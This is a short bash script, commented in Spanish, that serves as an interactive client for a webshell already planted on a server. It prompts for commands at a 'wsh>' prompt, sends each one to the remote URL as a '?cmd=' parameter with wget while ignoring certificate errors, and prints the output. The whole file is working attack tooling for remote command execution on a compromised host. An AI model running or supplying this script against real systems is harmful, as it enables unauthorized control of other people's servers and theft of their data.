#!/bin/bash

# usage ...
if [ $# -ne 1 ]
then
        echo "usa: $0 <url>"
        exit -1
fi

# url con webshell 
URL=$1

# teclas de edicion
set -o emacs

# leemos primer comando
read -e -p "wsh> " cmd
history -s $cmd

# bucle principal 
while [ "$cmd" != 'quit' ]; 
do

	# escrito comando ?
	if [ "x$cmd" != "x" ]; then
        	# wget -q -O - "$URL?cmd=$cmd" || echo "error"
        	wget --no-check-certificate -q -O - "$URL?cmd=$cmd" || echo "error de ejecucion!"
	fi

	# leemos siguiente comando
	read -e -p "wsh> " cmd
	history -s $cmd

done

#todo ok 
exit 0

